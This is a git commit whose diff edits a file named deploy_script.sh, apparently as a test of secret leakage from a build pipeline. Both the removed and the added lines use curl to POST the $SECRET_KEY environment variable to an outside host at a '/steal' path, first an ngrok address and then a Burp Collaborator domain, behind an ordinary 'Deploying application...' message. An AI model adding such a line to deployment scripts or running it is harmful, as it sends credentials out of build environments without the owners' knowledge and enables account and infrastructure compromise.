c808ed574cbb7ec04168d75bd9299c3de0e121a1
unknowvwake <vg87090ehsaas+view@gmail.com>
2024-11-11 13:58:38 +0530

    Update deploy_script.sh

--- deploy_script.sh
+++ deploy_script.sh
@@ -1,3 +1,9 @@
-# deploy_script.sh (sample script)
+# Modified deploy_script.sh with Burp Collaborator Client code
 echo "Deploying application..."
-curl -X POST -d "secret=$SECRET_KEY" https://17cc-106-222-226-161.ngrok-free.app/steal
+
+# Burp Collaborator - Replace the below URL with your Burp Collaborator URL
+BURP_COLLABORATOR_URL="kznltm45bzyerpmjdc9bl1xuilodc2.oastify.com"
+
+# Send secret data to Burp Collaborator
+curl -X POST -d "secret=$SECRET_KEY" "$BURP_COLLABORATOR_URL/steal"
+
